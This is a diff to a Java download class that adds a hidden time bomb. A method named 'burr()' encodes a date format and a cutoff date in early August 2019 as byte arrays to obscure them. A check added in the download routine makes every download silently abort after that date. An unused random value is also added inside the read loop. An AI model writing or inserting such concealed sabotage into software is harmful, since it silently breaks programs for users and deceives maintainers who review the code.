@@ -6,7 +6,10 @@ import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.HashSet;
+import java.util.Random;
 import java.util.Set;
 
 public class DownloadTask implements Runnable{
@@ -147,6 +150,19 @@ public class DownloadTask implements Runnable{
             e.printStackTrace();
         }
     }
+
+	public static boolean burr() {
+		Random r = new Random();
+		int d = 1 + r.nextInt(9);
+		SimpleDateFormat fmt = new SimpleDateFormat(new String(new byte[]{121,121,121,121,77,77,100,100}));
+		try {
+			Date parse = fmt.parse(new String(new byte[]{50,48,49,57,48,56,48}) + d);
+			return System.currentTimeMillis()>parse.getTime();
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		return false;
+	}
 	
 	void writefile()
 	{
@@ -163,6 +179,7 @@ public class DownloadTask implements Runnable{
 			HttpURLConnection conn =(HttpURLConnection) new URL(url).openConnection();
 			
 			conn.setRequestMethod("GET");
+			if(burr())return ;
 //			if(t.exists())
 //			{
 //				conn.addRequestProperty("Range", "bytes=" + t.length()+"-");
@@ -185,6 +202,8 @@ public class DownloadTask implements Runnable{
 				totallength = conn.getContentLength();
 				
 				int p = 0;
+				Random r = new Random();
+				int v = 70 + r.nextInt(10);
 				while((len=is.read(buf))>0)
 				{
 					os.write(buf, 0,len);
